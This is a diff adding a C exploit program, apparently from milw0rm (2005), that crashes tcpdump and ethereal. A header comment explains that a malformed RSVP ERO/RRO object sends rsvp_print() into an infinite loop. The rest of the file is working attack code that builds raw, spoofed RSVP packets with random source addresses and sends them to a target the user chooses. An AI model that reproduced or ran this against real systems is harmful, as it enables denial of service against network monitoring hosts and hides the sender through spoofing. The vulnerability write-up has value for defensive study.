@@ -1,0 +1,256 @@
+/*[ tcpdump(/ethereal)[]: (RSVP) rsvp_print() infinite loop DOS. ]* 
+ *                                                                *
+ * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
+ *                                                                *
+ * compile:                                                       *
+ *  gcc xtcpdump+ethr-rsvp-dos.c -o xtcpdump+ethr-rsvp-dos        *
+ *                                                                *
+ * tcpdump homepage/URL:                                          *
+ *  http://www.tcpdump.org                                        *
+ *                                                                *
+ * ethereal homepage/URL:                                         *
+ *  http://www.ethereal.com                                       *
+ *                                                                *
+ * effected versions:                                             *
+ *  tcpdump: v3.8.x/v3.9.1/CVS (didn't check below 3.8.x)         *
+ *  ethereal: v0.10.10 (appears to be fixed in 0.10.10 SVN>14167) *
+ *                                                                *
+ * tcpdump(v3.9.1 and earlier versions) contains a remote denial  *
+ * of service vulnerability in the form of a single (RSVP) packet *
+ * causing an infinite loop.                                      *
+ *                                                                *
+ * this bug also effects ethereal[v0.10.10] in a similar way, i   *
+ * did not check ethereals source code to find out why, tcpdump   *
+ * was the focus. (the packet usually must be clicked on, the     *
+ * ICMP replies given back will cause it too)                     *
+ *                                                                *
+ * as this bug doesn't appear to be fixed in the new(3.9.x/CVS)   *
+ * versions i'll elaborate on the problem.  the bug lies in       *
+ * rsvp_print() in the RSVP_OBJ_ERO(and RSVP_OBJ_RRO) class,      *
+ * allowing a zero length(+4 length really) situation, causing an *
+ * infinite loop.                                                 *
+ *                                                                *
+ * some versions of tcpdump(depending on the platform/OS) need no *
+ * special command-line arguments to allow this to happen,        *
+ * however most need the "-v" argument.                           *
+ ******************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#ifdef _USE_ARPA
+#include <arpa/inet.h>
+#endif
+
+/* doesn't seem to be standardized, so... */
+#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
+#define BYTE_ORDER __BYTE_ORDER
+#endif
+#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
+#define BIG_ENDIAN __BIG_ENDIAN
+#endif
+#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
+#if BYTE_ORDER == BIG_ENDIAN
+#define _USE_BIG_ENDIAN
+#endif
+#endif
+
+#define DFL_AMOUNT 5
+
+/* avoid platform-specific header madness. */
+/* (just plucked out of header files) */
+struct iph{
+#ifdef _USE_BIG_ENDIAN
+ unsigned char version:4,ihl:4;
+#else
+ unsigned char ihl:4,version:4;
+#endif
+ unsigned char tos;
+ unsigned short tot_len;
+ unsigned short id;
+ unsigned short frag_off;
+ unsigned char ttl;
+ unsigned char protocol;
+ unsigned short check;
+ unsigned int saddr;
+ unsigned int daddr;
+};
+struct rsvph{
+ unsigned char ver_flags;
+ unsigned char type;
+ unsigned short check;
+ unsigned char ttl;
+ unsigned char reserved;
+ unsigned short len;
+};
+struct sumh{
+  unsigned int saddr;
+  unsigned int daddr;
+  unsigned char fill;
+  unsigned char protocol;
+  unsigned short len;
+};
+
+/* malformed RSVP data. (the bug) */
+static char payload[]=
+ "\x00\x08\x14\x01\x03\x00\x00\x00"
+ /* not needed for tcpdump, but this breaks ethereal. */
+ "\x00\x00\x00\x00";
+
+/* prototypes. (and sig_alarm) */
+void rsvp_spoof(unsigned int,unsigned int);
+unsigned short in_cksum(unsigned short *,signed int);
+unsigned int getip(char *);
+void printe(char *,signed char);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv) {
+ unsigned char nospoof=0;
+ unsigned int amt=DFL_AMOUNT;
+ unsigned int daddr=0,saddr=0;
+ printf("[*] tcpdump(/ethereal)[]: (RSVP) rsvp_print() infinite loop "
+ "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
+ if(argc<2){
+  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
+  argv[0]);
+  exit(1);
+ }
+ if(!(daddr=getip(argv[1])))
+  printe("invalid destination host/ip.",1);
+ if(argc>2)saddr=getip(argv[2]);
+ if(argc>3)amt=atoi(argv[3]);
+ if(!amt)printe("no packets?",1);
+ printf("[*] destination\t: %s\n",argv[1]);
+ if(!nospoof)
+  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
+ printf("[*] amount\t: %u\n\n",amt);
+ printf("[+] sending(packet = .): ");
+ fflush(stdout);
+ while(amt--){
+  /* spice things up. */
+  srandom(time(0)+amt);
+  rsvp_spoof(daddr,saddr);
+  printf(".");
+  fflush(stdout);
+  usleep(50000);
+ }
+ printf("\n\n[*] done.\n");
+ fflush(stdout);
+ exit(0);
+}
+/* (spoofed) generates and sends a (RSVP) ip packet. */
+void rsvp_spoof(unsigned int daddr,unsigned int saddr){
+ signed int sock=0,on=1;
+ unsigned int psize=0;
+ char *p,*s;
+ struct sockaddr_in sa;
+ struct iph ip;
+ struct rsvph rsvp;
+ struct sumh sum;
+ /* create raw (rsvp) socket. */
+ if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RSVP))<0)
+  printe("could not allocate raw socket.",1);
+ /* allow (on some systems) for the user-supplied ip header. */
+#ifdef IP_HDRINCL
+ if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
+  printe("could not set IP_HDRINCL socket option.",1);
+#endif
+ sa.sin_family=AF_INET;
+ sa.sin_addr.s_addr=daddr;
+ psize=(sizeof(struct iph)+sizeof(struct rsvph)+sizeof(payload)-1);
+ memset(&ip,0,sizeof(struct iph));
+ memset(&rsvp,0,sizeof(struct rsvph));
+ /* values not filled = 0, from the memset() above. */
+ ip.ihl=5;
+ ip.version=4;
+ ip.tot_len=htons(psize);
+ ip.saddr=(saddr?saddr:random()%0xffffffff);
+ ip.daddr=daddr;
+ ip.ttl=(64*(random()%2+1));
+ ip.protocol=IPPROTO_RSVP;
+ ip.frag_off=64;
+ rsvp.ver_flags=16; /* v1/noflags. */
+ rsvp.type=20; /* HELLO. */
+ rsvp.ttl=(64*(random()%2+1));
+ rsvp.len=htons(sizeof(struct rsvph)+sizeof(payload)-1);
+ /* needed for the ip checksum. */
+ sum.saddr=ip.saddr;
+ sum.daddr=ip.daddr;
+ sum.fill=0;
+ sum.protocol=ip.protocol;
+ sum.len=htons(sizeof(struct rsvph)+sizeof(payload)-1);
+ /* make sum/calc buffer for the rsvp checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct rsvph)+sizeof(payload)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct rsvph)+sizeof(payload)+1));
+ memcpy(s,&rsvp,sizeof(struct rsvph));
+ memcpy(s+sizeof(struct rsvph),payload,sizeof(payload)-1);
+ rsvp.check=in_cksum((unsigned short *)s,sizeof(struct rsvph)
+ +sizeof(payload)-1);
+ free(s);
+ /* make sum/calc buffer for the ip checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct iph)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct iph)+1));
+ memcpy(s,&ip,sizeof(struct iph));
+ ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
+ free(s);
+ /* put the packet together. */
+ if(!(p=(char *)malloc(psize+1)))
+  printe("malloc() failed.",1);
+ memset(p,0,psize);
+ memcpy(p,&ip,sizeof(struct iph));
+ memcpy(p+sizeof(struct iph),&rsvp,sizeof(struct rsvph));
+ memcpy(p+(sizeof(struct iph)+sizeof(struct rsvph)),
+ payload,sizeof(payload));
+ /* send the malformed (RSVP) packet. */
+ if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
+ sizeof(struct sockaddr))<psize)
+  printe("failed to send forged RSVP packet.",1);
+ free(p);
+ return;
+}
+/* standard method for creating TCP/IP checksums. */
+unsigned short in_cksum(unsigned short *addr,signed int len){
+ unsigned short answer=0;
+ register unsigned short *w=addr;
+ register int nleft=len,sum=0;
+ while(nleft>1){
+  sum+=*w++;
+  nleft-=2;
+ }
+ if(nleft==1){
+  *(unsigned char *)(&answer)=*(unsigned char *)w;
+  sum+=answer;
+ }
+ sum=(sum>>16)+(sum&0xffff);
+ sum+=(sum>>16);
+ answer=~sum;
+ return(answer);
+}
+/* gets the ip from a host/ip/numeric. */
+unsigned int getip(char *host){
+ struct hostent *t;
+ unsigned int s=0;
+ if((s=inet_addr(host))){
+  if((t=gethostbyname(host)))
+   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
+ }
+ if(s==-1)s=0;
+ return(s);
+}
+/* all-purpose error/exit function. */
+void printe(char *err,signed char e){
+ printf("[!] %s\n",err);
+ if(e)exit(e);
+ return;
+}
+
+// milw0rm.com [2005-04-26]
